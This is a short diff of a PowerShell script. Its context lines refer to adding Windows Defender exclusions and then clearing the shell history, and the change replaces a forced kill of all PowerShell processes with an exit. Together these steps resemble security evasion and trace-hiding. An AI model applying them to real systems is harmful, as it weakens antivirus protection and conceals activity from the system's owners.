@@ -78,11 +78,8 @@ try {
     #Write-Output "Error: Unable to add exclusions to Windows Defender."
 }
 
-
 # Clear history (no error handling required, as it's safe)
 Clear-History
 
-
-Start-Sleep -Seconds 1
-
-Get-Process powershell | Stop-Process -Force
+# Exit the script
+exit
